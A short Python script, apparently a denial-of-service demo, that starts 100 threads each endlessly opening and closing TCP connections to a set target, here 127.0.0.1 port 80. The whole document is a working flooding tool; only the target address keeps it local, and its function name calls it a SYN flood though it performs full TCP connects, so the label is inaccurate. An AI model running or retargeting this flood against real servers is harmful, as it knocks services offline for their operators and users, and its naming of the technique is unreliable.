import socket
import threading

target_ip = "127.0.0.1"   # localhost ip address
target_port = 80

def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.close()
        except:
            pass

# Creating multiple threads (simulating many users)
for i in range(100):
    t = threading.Thread(target=syn_flood)
    t.start()
